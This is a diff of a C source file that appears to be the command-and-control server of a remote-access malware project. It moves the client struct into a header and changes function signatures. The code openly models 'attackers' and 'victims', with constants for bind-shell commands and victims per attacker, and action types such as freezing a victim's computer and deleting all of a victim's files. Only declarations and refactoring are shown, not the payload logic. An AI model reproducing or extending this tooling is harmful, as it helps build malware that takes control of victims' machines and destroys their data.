@@ -10,15 +10,14 @@
 #include <sys/time.h> //FD_SET, FD_ISSET, FD_ZERO macros 
 #include <time.h>
 #include "md5.h"
-
-
+#include "client_data_structure.h"
 
 #define TRUE 1 
 #define FALSE 0 
 #define MTU 1024
 #define PORT 50007
 #define HASH_LEN 34
-#define MAX_CLIENTS 30
+//#define MAX_CLIENTS 30
 #define MAX_VICTIMS_PER_ATTACKER 10
 #define MAX_BIND_SHELL_COMMAND 500
 
@@ -32,11 +31,6 @@
 #define LICENSE_KEY_LENGTH 20
 
 struct sockaddr_in address;
-
-typedef enum {
-	ATTACKER, 
-	VICTIM
-} sender;
 
 typedef enum {
 	LOG_IN,
@@ -54,15 +48,6 @@ typedef enum {
 	STUCK_VICTIMS_COMPUTER,
 	DELETE_VICTIMS_ALL_FILES,
 } action_type;
-
-typedef struct {
-	sender i_am;
-	int socket_fd;
-	int other_side_sfd; // for the attakcer 'other_side_sfd' means the socket file descriptor of his courent victim.
-					   //  for the victim 'other_side_sfd' means the socket file descriptor of his attcker.
-	char id[HASH_LEN];
-	char name[MAX_USER_NAME_LEN];
-} client;
 
 typedef struct {
 	char victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
@@ -136,14 +121,14 @@ typedef struct {
 } encrypted_general_message_protocol;
 
 
-client clients_list[MAX_CLIENTS];
+//client_delet clients_list[MAX_CLIENTS];
 int master_socket, addrlen, new_socket, activity, socket_descriptor;
 int max_socket_descriptor; 
 fd_set readfds; //set of socket descriptors
 
 void initialize_connection();
-void add_child_sockets_to_set();
-void set_attacker_victim_connection (client * attacker, char * selected_victim_name);
+void add_child_sockets_to_set(client_ptr * client_list);
+void set_attacker_victim_connection (client_ptr * attacker, client_ptr * client_list, int num_of_connected_clients, char * selected_victim_name);
+void send_to_attacker_connected_victims (client_ptr attacker, client_ptr client_list, int num_of_connected_clients);
 char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
 char * decrypt_text (char * text_to_decrypt, char * decryption_key);
-void send_to_attacker_connected_victims (client attacker);
